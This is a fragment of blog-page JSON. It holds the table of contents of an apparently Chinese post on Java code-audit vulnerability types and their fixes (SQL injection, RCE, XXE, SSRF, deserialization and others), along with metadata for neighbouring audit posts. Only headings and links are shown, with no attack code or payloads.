class=\"toc-text\">环境搭建：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5%EF%BC%9A\"><span class=\"toc-text\">SQL注入：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#JDBC%EF%BC%9A\"><span class=\"toc-text\">JDBC：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">漏洞代码：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">修复代码：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#like%E9%A2%84%E7%BC%96%E8%AF%91%E9%97%AE%E9%A2%98%EF%BC%9A\"><span class=\"toc-text\">like预编译问题：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%94%99%E8%AF%AF%E5%86%99%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">错误写法：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%AD%A3%E7%A1%AE%E5%86%99%E6%B3%951%EF%BC%9A\"><span class=\"toc-text\">正确写法1：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%99%E6%B3%952%EF%BC%9A\"><span class=\"toc-text\">写法2：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#order-by%EF%BC%9A\"><span class=\"toc-text\">order by：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Mybatis%EF%BC%9A\"><span class=\"toc-text\">Mybatis：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB%EF%BC%9A\"><span class=\"toc-text\">框架识别：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%98%A0%E5%B0%84%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">映射方法：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8B%BC%E6%8E%A5%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">拼接方法：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%EF%BC%9A\"><span class=\"toc-text\">${}：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#like%E4%BF%AE%E5%A4%8D%EF%BC%9A\"><span class=\"toc-text\">like修复：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#order-by%E4%BF%AE%E5%A4%8D%EF%BC%9A\"><span class=\"toc-text\">order by修复：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Hibernate%EF%BC%9A\"><span class=\"toc-text\">Hibernate：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%90%E6%A7%BD%EF%BC%9A\"><span class=\"toc-text\">吐槽：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#RCE%EF%BC%9A\"><span class=\"toc-text\">RCE：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Runtime-exec%EF%BC%9A\"><span class=\"toc-text\">Runtime.exec：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ProcessBuilder%EF%BC%9A\"><span class=\"toc-text\">ProcessBuilder：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ScriptEngine%EF%BC%9A\"><span class=\"toc-text\">ScriptEngine：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#snakeyaml%EF%BC%9A\"><span class=\"toc-text\">snakeyaml：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#groovy%EF%BC%9A\"><span class=\"toc-text\">groovy：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E7%B1%BB%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">文件访问类漏洞：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">任意文件读取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-1\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NIO%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%9A\"><span class=\"toc-text\">NIO任意文件读取：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%9A\"><span class=\"toc-text\">文件写入：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%9A\"><span class=\"toc-text\">任意文件删除：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6-%E7%A7%BB%E5%8A%A8%EF%BC%9A\"><span class=\"toc-text\">任意文件复制&#x2F;移动：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%EF%BC%9A\"><span class=\"toc-text\">重命名文件：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%EF%BC%9A\"><span class=\"toc-text\">文件目录遍历：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-2\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">文件上传漏洞：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9A\"><span class=\"toc-text\">任意文件上传：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-3\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#xss%EF%BC%9A\"><span class=\"toc-text\">xss：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%B0%84%E6%80%A7%EF%BC%9A\"><span class=\"toc-text\">反射性：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%82%A8%E5%9E%8B%EF%BC%9A\"><span class=\"toc-text\">存储型：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#DOM%E5%9E%8B%EF%BC%9A\"><span class=\"toc-text\">DOM型：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-4\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#csrf%EF%BC%9A\"><span class=\"toc-text\">csrf：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ssrf%EF%BC%9A\"><span class=\"toc-text\">ssrf：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">关键方法：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-5\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#XXE%EF%BC%9A\"><span class=\"toc-text\">XXE：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%9A\"><span class=\"toc-text\">有回显：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DocumentBuilder%EF%BC%9A\"><span class=\"toc-text\">DocumentBuilder：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#payload%EF%BC%9A\"><span class=\"toc-text\">payload：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%9A\"><span class=\"toc-text\">无回显：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#xmlReader%EF%BC%9A\"><span class=\"toc-text\">xmlReader：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#payload%EF%BC%9A-1\"><span class=\"toc-text\">payload：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SAXBuilder%EF%BC%9A\"><span class=\"toc-text\">SAXBuilder：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SAXPeader%EF%BC%9A\"><span class=\"toc-text\">SAXPeader：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SAXParser%EF%BC%9A\"><span class=\"toc-text\">SAXParser：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Digester%EF%BC%9A\"><span class=\"toc-text\">Digester：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-6\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%EF%BC%9A\"><span class=\"toc-text\">SPEL表达式注入：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E5%AD%97%EF%BC%9A\"><span class=\"toc-text\">关键字：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-7\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">Java反序列化漏洞：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3%EF%BC%9A\"><span class=\"toc-text\">简单了解：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%EF%BC%9A-8\"><span class=\"toc-text\">修复：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">小结：</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java代码审计练习项目Mini-Tmall","uid":"b150dfa8a93554c7d2d6ced6f280771f","slug":"Java代码审计练习项目Mini-Tmall","date":"2022-12-10T07:38:39.000Z","updated":"2022-12-14T12:05:41.459Z","comments":true,"path":"api/articles/Java代码审计练习项目Mini-Tmall.json","keywords":null,"cover":[],"text":" 环境搭建：项目地址：https://gitee.com/project_team/Tmall_demo#%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E 大佬视频教程链接：https://www.bilibili.co...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"Java","slug":"Java","count":16,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"PHPCMS1.0审计","uid":"ca074290e7d8ca9fde2aa858e7b4cb94","slug":"PHPCMS1-0审计","date":"2022-12-05T11:31:46.000Z","updated":"2022-12-09T10:30:51.055Z","comments":true,"path":"api/articles/PHPCMS1-0审计.json","keywords":null,"cover":[],"text":" https://github.com/harshitbansal373/PHP-CMS CREATE DATABASE cms DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci; use cms source D:/cms.s...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"PHP","slug":"PHP","count":7,"path":"api/tags/PHP.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}